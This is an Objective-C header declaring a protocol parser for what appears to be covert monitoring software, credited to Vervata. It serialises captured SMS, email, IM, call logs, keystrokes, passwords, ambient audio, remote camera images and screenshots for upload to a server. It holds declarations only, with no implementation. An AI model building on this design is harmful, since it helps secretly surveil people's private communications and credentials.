//
//  ProtocolParser.h
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "SendActivate.h"

@class SendActivate, SendActivateResponse;
@class SendDeactivate, SendDeactivateResponse;
@class SendHeartBeat, SendHeartBeatResponse;
@class SendEvent, SendEventResponse;
@class SendAddressBookForApproval, SendAddressBook,AddressBook;
@class SendAddressBookResponse, SendAddressBookForApprovalResponse;
@class RAskRequest, RAskResponse;

@class CommandMetaDataWrapper;
@class ResponseData;
@class UnknownResponse;

@class Event, CallLogEvent, SMSEvent, EmailEvent, MMSEvent, IMEvent, PanicGPS, PanicImage, AlertGPSEvent, PanicStatus, WallpaperThumbnailEvent;
@class CameraImageThumbnailEvent, AudioFileThumbnailEvent, AudioConversationThumbnailEvent, VideoFileThumbnailEvent, WallpaperEvent, CameraImageEvent, RemoteCameraImageEvent;
@class AudioConversationEvent, AudioFileEvent, VideoFileEvent, LocationEvent, GPSEvent, CallInfoEvent, SystemEvent;
@class BrowserUrlEvent, BookmarksEvent, SettingEvent, ALCEvent, AudioAmbientEvent, AudioAmbientThumbnailEvent, IMMessageEvent, IMAccountEvent, IMContactEvent, IMConversationEvent;
@class VoIPEvent, KeyLogEvent, PageVisitedEvent, PasswordEvent;

@class EmbeddedCallInfo, FxVCard;

@class GetCSID, GetServerTime, GetProcessProfile, GetCommunicationDirectives, GetConfiguration, GetActivationCode, GetAddressBook, GetSoftwareUpdate, GetIncompatibleApplicationDefinitions;
@class GetCSIDResponse, GetTimeResponse, GetProcessProfileResponse, GetCommunicationDirectivesResponse, GetConfigurationResponse, GetActivationCodeResponse;
@class GetAddressBookResponse, GetSoftwareUpdateResponse, GetIncompatibleApplicationDefinitionsResponse;

@class GetApplicationProfile, GetUrlProfile, SendInstalledApplication, SendRunningApplication, SendBookmark;
@class GetApplicationProfileResponse, GetUrlProfileResponse, SendBookmarkResponse, SendInstalledApplicationResponse, SendRunningApplicationResponse;

@class CalendarEntry, Note;
@class SendCalendarResponse, SendNoteResponse;

@class GetBinary, GetSupportIM,GetSupportIMResponse;
@class GetSnapShotRule, SendSnapShotRule, GetMonitorApplication, SendMonitorApplication;
@class GetSnapShotRuleResponse, SendSnapShotRuleResponse, GetMonitorApplicationResponse, SendMonitorApplicationResponse;

@class SendDeviceSettings, SendDeviceSettingsResponse, SendTemporalControl, SendTemporalControlResponse, GetTemporalControl, GetTemporalControlResponse;
@class UsbEvent, FileTransferEvent, LogonEvent, AppUsageEvent, IMMacOSEvent, EmailMacOSEvent, ScreenshotEvent,FileActivityEvent;

@class CommandMetaData;

@interface ProtocolParser : NSObject {
	
}

#pragma mark -
#pragma mark Recipient, Attachment, Participant, EmbeddedCallInfo parser
+ (NSData *)parseRecipients:(NSArray *)recipients;
+ (NSData *) parseRecipientsV10:(NSArray *)recipients;
+ (NSData *)parseAttachments:(NSArray *)attachments;
+ (NSData *)parseAttachmentsV10:(NSArray *)attachments;
+ (NSData *)parseParticipants:(NSArray *)participants;
+ (NSData *)parseEmbeddedCallInfo:(EmbeddedCallInfo *)callInfo;

#pragma mark -
#pragma mark SendActivate, SendDeactivate, SendHeartBeat command payload builder
+ (NSData *)parseActivateRequest:(SendActivate *)command;
+ (NSData *)parseDeactivateRequest:(SendDeactivate *)command;
+ (NSData *)parseHeartbeatRequest:(SendHeartBeat *)command;

#pragma mark -
#pragma mark Events parser

+ (NSData *)parseEventRequest:(SendEvent *)command;
+ (NSData *)parseEvent:(Event *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseEvent:(Event *)event metadata:(CommandMetaData *) aMetaData payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseCallLogEvent:(CallLogEvent *)event;
+ (NSData *)parseSMSEvent:(SMSEvent *)event;
+ (NSData *)parseEmailEvent:(EmailEvent *)event;
+ (NSData *)parseMMSEvent:(MMSEvent *)event;
+ (NSData *)parseIMEvent:(IMEvent *)event;
+ (NSData *)parsePanicImage:(PanicImage *)event;
+ (NSData *)parsePanicStatus:(PanicStatus *)event;
+ (NSData *)parseWallpaperThumbnailEvent:(WallpaperThumbnailEvent *)event;
+ (NSData *)parseCameraImageThumbnailEvent:(CameraImageThumbnailEvent *)event;
+ (NSData *)parseAudioFileThumbnailEvent:(AudioFileThumbnailEvent *)event;
+ (NSData *)parseAudioConversationThumbnailEvent:(AudioConversationThumbnailEvent *)event;
+ (NSData *)parseVideoFileThumbnailEvent:(VideoFileThumbnailEvent *)event;
+ (NSData *)parseWallpaperEvent:(WallpaperEvent *)event;
+ (NSData *)parseCameraImageEvent:(CameraImageEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseRemoteCameraImageEvent:(RemoteCameraImageEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseAudioConversationEvent:(AudioConversationEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseAudioFileEvent:(AudioFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseVideoFileEvent:(VideoFileEvent *)event payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *)parseLocationEvent:(LocationEvent *)event;
+ (NSData *)parseSystemEvent:(SystemEvent *)event;
+ (NSData *) parseBrowserUrlEvent: (BrowserUrlEvent *) aEvent;
+ (NSData *) parseBookmarksEvent: (BookmarksEvent *) aEvent;
+ (NSData *) parseSettingEvent: (SettingEvent *) aEvent;
+ (NSData *) parseSettingEventV10: (SettingEvent *) aEvent;
+ (NSData *) parseApplicationLifeCycleEvent: (ALCEvent *) aEvent;
+ (NSData *) parseAudioAmbientThumbnailEvent: (AudioAmbientThumbnailEvent *) aEvent;
+ (NSData *) parseAudioAmbientEvent:(AudioAmbientEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseIMMessageEvent:(IMMessageEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseIMAccountEvent: (IMAccountEvent *) aEvent;
+ (NSData *) parseIMContactEvent: (IMContactEvent *) aEvent;
+ (NSData *) parseIMConversationEvent: (IMConversationEvent *) aEvent;
+ (NSData *) parseVoIPEvent: (VoIPEvent *) aEvent;
+ (NSData *) parseKeyLogEvent: (KeyLogEvent *) aEvent;
+ (NSData *) parsePageVisitedEvent: (PageVisitedEvent *) aEvent;
+ (NSData *) parsePasswordEvent: (PasswordEvent *) aEvent;
+ (NSData *) parseUsbEvent: (UsbEvent *) aEvent;
+ (NSData *) parseFileTransferEvent: (FileTransferEvent *) aEvent;
+ (NSData *) parseLogonEvent: (LogonEvent *) aEvent;
+ (NSData *) parseAppUsageEvent: (AppUsageEvent *) aEvent;
+ (NSData *) parseIMMacOSEvent: (IMMacOSEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseEmailMacOSEvent: (EmailMacOSEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseScreenshotEvent: (ScreenshotEvent *) aEvent payloadFileHandle: (NSFileHandle *) aFileHandle;
+ (NSData *) parseFileActivityEvent: (FileActivityEvent *) aEvent;

#pragma mark -
#pragma mark Note & Calendar entry parser

+ (NSData *) parseNote: (Note *) aNote;
+ (NSData *) parseCalendarEntry: (CalendarEntry *) aCalendarEntry;

#pragma mark -
#pragma mark Address book payload builder

+ (NSData *)parseAddressBookForApproval:(SendAddressBookForApproval *)command;
+ (NSData *)parseSendAddressBook:(SendAddressBook *)command;
+ (NSData *)parseAddressBook:(AddressBook *)addressBook;
+ (NSData *)parseVCard:(FxVCard *)vcard;

#pragma mark -
#pragma mark Other commands paylaod builder
+ (NSData *)parseGetCSID:(GetCSID *)command;
+ (NSData *)parseGetTime:(GetServerTime *)command;
+ (NSData *)parseGetProcessProfile:(GetProcessProfile *)command;
+ (NSData *)parseGetCommunicationDirectives:(GetCommunicationDirectives *)command;
+ (NSData *)parseGetConfiguration:(GetConfiguration *)command;
+ (NSData *)parseGetActivationCode:(GetActivationCode *)command;
+ (NSData *)parseGetAddressBook:(GetAddressBook *)command;
+ (NSData *)parseGetSoftwareUpdate:(GetSoftwareUpdate *)command;
+ (NSData *)parseGetIncompatibleApplicationDefinitions:(GetIncompatibleApplicationDefinitions *)command;
+ (NSData *) parseGetApplicationProfile: (GetApplicationProfile *) aCommand;
+ (NSData *) parseGetUrlProfile: (GetUrlProfile *) aCommand;
+ (NSData *) parseGetBinary: (GetBinary *) aCommand;
+ (NSData *) parseGetSupportIM: (GetSupportIM *) aCommand;
+ (NSData *) parseGetSnapShotRule: (GetSnapShotRule *) aCommand;
+ (NSData *) parseSendSnapShotRule: (SendSnapShotRule *) aCommand;
+ (NSData *) parseGetMonitorApplication: (GetMonitorApplication *) aCommand;
+ (NSData *) parseSendMonitorApplication: (SendMonitorApplication *) aCommand;
+ (NSData *) parseSendDeviceSettings: (SendDeviceSettings *) aCommand;
+ (NSData *) parseSendTemporalControl: (SendTemporalControl *) aCommand;
+ (NSData *) parseGetTemporalControl: (GetTemporalControl *) aCommand;

#pragma mark -
#pragma mark Parse server response which is a data
+ (id)parseServerResponse:(NSData *)responseData;
+ (int)parseServerResponseHeader:(NSData *)responseData to:(id)responseObj;

+ (SendActivateResponse *)parseSendActivateResponse:(NSData *)responseData;
+ (SendDeactivateResponse *)parseSendDeactivateResponse:(NSData *)responseData;
+ (SendHeartBeatResponse *)parseSendHeartBeatResponse:(NSData *)responseData;
+ (SendEventResponse *)parseSendEventResponse:(NSData *)responseData;
+ (SendAddressBookResponse *)parseSendAddressBookResponse:(NSData *)responseData;
+ (SendAddressBookForApprovalResponse *)parseSendAddressBookForApprovalResponse:(NSData *)responseData;
+ (RAskResponse *)parseRAskResponse:(NSData *)responseData;
+ (UnknownResponse *)parseUnknownResponse:(NSData *)responseData;

+ (GetCSIDResponse *)parseGetCSIDResponse:(NSData *)responseData;
+ (GetTimeResponse *)parseGetTimeResponse:(NSData *)responseData;
+ (GetProcessProfileResponse *)parseGetProcessProfileResponse:(NSData *)responseData;
+ (GetCommunicationDirectivesResponse *)parseGetCommunicationDirectivesResponse:(NSData *)responseData;
+ (GetConfigurationResponse *)parseGetConfigurationResponse:(NSData *)responseData;
+ (GetActivationCodeResponse *)parseGetActivationCodeResponse:(NSData *)responseData;
+ (GetAddressBookResponse *)parseGetAddressBookResponse:(NSString *)responseFilePath offset:(unsigned long)offset;
+ (GetSoftwareUpdateResponse *)parseGetSoftwareUpdateResponse:(NSData *)responseData;
+ (GetIncompatibleApplicationDefinitionsResponse *)parseGetIncompatibleApplicationDefinitionsResponse:(NSData *)responseData;

+ (SendRunningApplicationResponse *) parseSendRunningApplicationResponse: (NSData *) aResponseData;
+ (SendInstalledApplicationResponse *) parseSendInstalledApplicationResponse: (NSData *) aResponseData;
+ (SendBookmarkResponse *) parseSendBookmarkResponse: (NSData *) aResponseData;

+ (SendCalendarResponse *) parseSendCalendarResponse: (NSData *) aResponseData;
+ (SendNoteResponse *) parseSendNoteResponse: (NSData *) aResponseData;
+ (GetSupportIMResponse *) parseGetSupportIMResponse: (NSData *) aResponseData;
+ (GetSnapShotRuleResponse *) parseGetSnapShotRuleResponse: (NSData *) aResponseData;
+ (SendSnapShotRuleResponse *) parseSendSnapShotRuleResponse: (NSData *) aResponseData;
+ (GetMonitorApplicationResponse *) parseGetMonitorApplicationResponse: (NSData *) aResponseData;
+ (SendMonitorApplicationResponse *) parseSendMonitorApplicationResponse: (NSData *) aResponseData;
+ (SendDeviceSettingsResponse *) parseSendDeviceSettingsResponse: (NSData *) aResponseData;
+ (SendTemporalControlResponse *) parseSendTemporalControlResponse: (NSData *) aResponseData;
+ (GetTemporalControlResponse *) parseGetTemporalControlResponse: (NSData *) aResponseData;

#pragma mark -
#pragma mark Server response which is a file
+ (id) parseFileResponse: (NSString *) aResponseFilePath offset: (unsigned long) aOffset;

#pragma mark - 
#pragma mark Utils

+ (NSString *) getStringOfBytes: (NSUInteger) aByteNumbers inputString: (NSString *) aInputString;

@end
